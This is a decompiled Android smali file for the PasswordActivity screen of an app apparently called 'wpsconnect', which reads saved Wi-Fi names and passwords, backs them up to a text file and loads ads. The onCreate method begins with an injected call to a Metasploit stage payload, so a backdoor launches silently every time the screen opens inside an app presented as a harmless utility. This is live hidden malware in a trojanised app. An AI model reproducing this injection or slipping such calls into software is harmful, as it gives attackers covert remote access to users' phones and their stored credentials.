.class public Lcom/ngb/wpsconnect/PasswordActivity;
.super Landroid/support/v7/a/d;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/ngb/wpsconnect/PasswordActivity$a;,
        Lcom/ngb/wpsconnect/PasswordActivity$b;
    }
.end annotation


# static fields
.field protected static p:Z

.field static q:Ljava/text/SimpleDateFormat;

.field static final r:Ljava/lang/String;

.field private static s:Z


# instance fields
.field protected m:Landroid/widget/ListView;

.field protected n:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Lcom/ngb/wpsconnect/d;",
            ">;"
        }
    .end annotation
.end field

.field protected o:Landroid/widget/ArrayAdapter;

.field private final t:I


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v0, 0x1

    sput-boolean v0, Lcom/ngb/wpsconnect/PasswordActivity;->p:Z

    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "_ddMMyyyy"

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    sput-object v0, Lcom/ngb/wpsconnect/PasswordActivity;->q:Ljava/text/SimpleDateFormat;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "backup"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lcom/ngb/wpsconnect/PasswordActivity;->q:Ljava/text/SimpleDateFormat;

    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    invoke-virtual {v1, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ".txt"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/ngb/wpsconnect/PasswordActivity;->r:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/support/v7/a/d;-><init>()V

    const/16 v0, 0xc8

    iput v0, p0, Lcom/ngb/wpsconnect/PasswordActivity;->t:I

    return-void
.end method

.method static synthetic a(Lcom/ngb/wpsconnect/PasswordActivity;Ljava/util/List;)Ljava/util/ArrayList;
    .locals 1

    invoke-direct {p0, p1}, Lcom/ngb/wpsconnect/PasswordActivity;->a(Ljava/util/List;)Ljava/util/ArrayList;

    move-result-object v0

    return-object v0
.end method

.method private a(Ljava/util/List;)Ljava/util/ArrayList;
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;)",
            "Ljava/util/ArrayList",
            "<",
            "Lcom/ngb/wpsconnect/d;",
            ">;"
        }
    .end annotation

    const/4 v3, 0x0

    const/4 v1, 0x1

    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    const-string v4, ""

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    move v2, v3

    :goto_0
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    if-nez v2, :cond_0

    invoke-virtual {v0, v3, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v7

    const-string v8, "s"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_0

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    move-object v2, v0

    move v0, v1

    :goto_1
    move-object v4, v2

    move v2, v0

    goto :goto_0

    :cond_0
    if-eqz v2, :cond_1

    invoke-virtual {v0, v3, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v7

    const-string v8, "s"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_1

    new-instance v7, Lcom/ngb/wpsconnect/d;

    const-string v8, "--"

    invoke-direct {v7, v4, v8}, Lcom/ngb/wpsconnect/d;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v5, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    move v9, v2

    move-object v2, v0

    move v0, v9

    goto :goto_1

    :cond_1
    if-eqz v2, :cond_3

    invoke-virtual {v0, v3, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v7

    const-string v8, "p"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_3

    new-instance v2, Lcom/ngb/wpsconnect/d;

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v2, v4, v0}, Lcom/ngb/wpsconnect/d;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move v0, v3

    move-object v2, v4

    goto :goto_1

    :cond_2
    return-object v5

    :cond_3
    move v0, v2

    move-object v2, v4

    goto :goto_1
.end method

.method static synthetic a(Lcom/ngb/wpsconnect/PasswordActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->m()V

    return-void
.end method

.method static synthetic b(Lcom/ngb/wpsconnect/PasswordActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->l()V

    return-void
.end method

.method static synthetic b(Z)Z
    .locals 0

    sput-boolean p0, Lcom/ngb/wpsconnect/PasswordActivity;->s:Z

    return p0
.end method

.method static synthetic c(Lcom/ngb/wpsconnect/PasswordActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->o()V

    return-void
.end method

.method private k()V
    .locals 3

    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/PasswordActivity$1;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/PasswordActivity$1;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    const v1, 0x7f07004d

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(I)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    const v1, 0x102000b

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    invoke-static {}, Landroid/text/method/LinkMovementMethod;->getInstance()Landroid/text/method/MovementMethod;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setMovementMethod(Landroid/text/method/MovementMethod;)V

    return-void
.end method

.method private l()V
    .locals 3

    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/PasswordActivity$2;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/PasswordActivity$2;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    const v1, 0x7f070044

    new-instance v2, Lcom/ngb/wpsconnect/PasswordActivity$3;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/PasswordActivity$3;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setNegativeButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    const v1, 0x7f07004a

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(I)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    return-void
.end method

.method private m()V
    .locals 4

    const/4 v3, 0x0

    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"

    invoke-static {p0, v0}, Landroid/support/v4/b/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_0

    new-instance v0, Lcom/ngb/wpsconnect/PasswordActivity$b;

    sget-object v1, Lcom/ngb/wpsconnect/PasswordActivity;->r:Ljava/lang/String;

    invoke-direct {v0, p0, v1}, Lcom/ngb/wpsconnect/PasswordActivity$b;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;Ljava/lang/String;)V

    new-array v1, v3, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/ngb/wpsconnect/PasswordActivity$b;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    :goto_0
    return-void

    :cond_0
    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/PasswordActivity$4;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/PasswordActivity$4;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    const v1, 0x7f070044

    new-instance v2, Lcom/ngb/wpsconnect/PasswordActivity$5;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/PasswordActivity$5;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setNegativeButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    const v1, 0x7f070040

    invoke-virtual {p0, v1}, Lcom/ngb/wpsconnect/PasswordActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    goto :goto_0
.end method

.method private n()V
    .locals 3

    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/PasswordActivity$6;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/PasswordActivity$6;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    const v1, 0x7f070044

    new-instance v2, Lcom/ngb/wpsconnect/PasswordActivity$7;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/PasswordActivity$7;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setNegativeButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    const v1, 0x7f070067

    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(I)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    return-void
.end method

.method private o()V
    .locals 3

    const v0, 0x7f0d0099

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/PasswordActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Lcom/google/android/gms/ads/AdView;

    new-instance v1, Lcom/google/android/gms/ads/c$a;

    invoke-direct {v1}, Lcom/google/android/gms/ads/c$a;-><init>()V

    sget-object v2, Lcom/google/android/gms/ads/c;->a:Ljava/lang/String;

    invoke-virtual {v1, v2}, Lcom/google/android/gms/ads/c$a;->b(Ljava/lang/String;)Lcom/google/android/gms/ads/c$a;

    move-result-object v1

    const-string v2, "73A142758B586E36148D8867CD16EB3C"

    invoke-virtual {v1, v2}, Lcom/google/android/gms/ads/c$a;->b(Ljava/lang/String;)Lcom/google/android/gms/ads/c$a;

    move-result-object v1

    const-string v2, "A123691FEE8C9923FE6E625C530D7BB6"

    invoke-virtual {v1, v2}, Lcom/google/android/gms/ads/c$a;->b(Ljava/lang/String;)Lcom/google/android/gms/ads/c$a;

    move-result-object v1

    const-string v2, "F90025084208E15E34122013267C1B50"

    invoke-virtual {v1, v2}, Lcom/google/android/gms/ads/c$a;->b(Ljava/lang/String;)Lcom/google/android/gms/ads/c$a;

    move-result-object v1

    invoke-virtual {v1}, Lcom/google/android/gms/ads/c$a;->a()Lcom/google/android/gms/ads/c;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/android/gms/ads/AdView;->a(Lcom/google/android/gms/ads/c;)V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 1

    invoke-super {p0}, Landroid/support/v7/a/d;->onBackPressed()V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/ngb/wpsconnect/PasswordActivity;->p:Z

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v2, 0x0

    invoke-super {p0, p1}, Landroid/support/v7/a/d;->onCreate(Landroid/os/Bundle;)V

    sget-boolean v0, Lcom/ngb/wpsconnect/PasswordActivity;->p:Z

    if-eqz v0, :cond_0

    sput-boolean v2, Lcom/ngb/wpsconnect/PasswordActivity;->p:Z

    new-instance v0, Lcom/ngb/wpsconnect/PasswordActivity$a;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/ngb/wpsconnect/PasswordActivity$a;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;Lcom/ngb/wpsconnect/PasswordActivity$1;)V

    new-array v1, v2, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/ngb/wpsconnect/PasswordActivity$a;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    :cond_0
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 3

    const/4 v2, 0x1

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const v1, 0x7f0e0002

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->g()Landroid/support/v7/a/a;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0, v2}, Landroid/support/v7/a/a;->a(Z)V

    :cond_0
    return v2
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 4

    const/4 v0, 0x1

    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v1

    sparse-switch v1, :sswitch_data_0

    invoke-super {p0, p1}, Landroid/support/v7/a/d;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v0

    :goto_0
    return v0

    :sswitch_0
    invoke-virtual {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->onBackPressed()V

    goto :goto_0

    :sswitch_1
    invoke-direct {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->k()V

    goto :goto_0

    :sswitch_2
    sget-boolean v1, Lcom/ngb/wpsconnect/PasswordActivity;->s:Z

    if-eqz v1, :cond_0

    invoke-direct {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->l()V

    goto :goto_0

    :cond_0
    invoke-virtual {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const v2, 0x7f070042

    invoke-virtual {p0, v2}, Lcom/ngb/wpsconnect/PasswordActivity;->getString(I)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v1, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    goto :goto_0

    nop

    :sswitch_data_0
    .sparse-switch
        0x102002c -> :sswitch_0
        0x7f0d00ad -> :sswitch_2
        0x7f0d00ae -> :sswitch_1
    .end sparse-switch
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 3

    const/4 v2, 0x0

    packed-switch p1, :pswitch_data_0

    :goto_0
    return-void

    :pswitch_0
    array-length v0, p3

    if-lez v0, :cond_0

    aget v0, p3, v2

    if-nez v0, :cond_0

    new-instance v0, Lcom/ngb/wpsconnect/PasswordActivity$b;

    sget-object v1, Lcom/ngb/wpsconnect/PasswordActivity;->r:Ljava/lang/String;

    invoke-direct {v0, p0, v1}, Lcom/ngb/wpsconnect/PasswordActivity$b;-><init>(Lcom/ngb/wpsconnect/PasswordActivity;Ljava/lang/String;)V

    new-array v1, v2, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/ngb/wpsconnect/PasswordActivity$b;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_0

    :cond_0
    invoke-direct {p0}, Lcom/ngb/wpsconnect/PasswordActivity;->n()V

    goto :goto_0

    nop

    :pswitch_data_0
    .packed-switch 0xc8
        :pswitch_0
    .end packed-switch
.end method
